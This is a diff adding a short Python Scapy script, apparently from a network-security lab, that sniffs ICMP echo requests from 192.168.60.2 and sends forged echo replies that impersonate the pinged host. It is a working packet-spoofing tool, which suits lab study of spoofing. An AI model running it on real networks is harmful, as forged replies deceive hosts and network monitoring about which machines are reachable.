@@ -1,0 +1,23 @@
+#!/usr/bin/python3
+from scapy.all import *
+
+def spoof_pkt(pkt):
+    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
+        src_ip = pkt[IP].src
+        dst_ip = pkt[IP].dst
+        icmp_id = pkt[ICMP].id
+        icmp_seq = pkt[ICMP].seq
+
+        ip = IP(src=dst_ip, dst=src_ip)
+        icmp = ICMP(type=0, id=icmp_id, seq=icmp_seq)
+
+        if pkt.haslayer(Raw):
+            data = pkt[Raw].load
+            new_pkt = ip/icmp/data
+        else:
+            new_pkt = ip/icmp
+
+        send(new_pkt, verbose=0, iface='eth0')  # 修改为实际接口名
+        print(f"[+] Spoofed ICMP reply: {dst_ip} -> {src_ip}")
+
+sniff(filter="icmp and src host 192.168.60.2", iface='eth0', prn=spoof_pkt)  # 修改为实际接口名
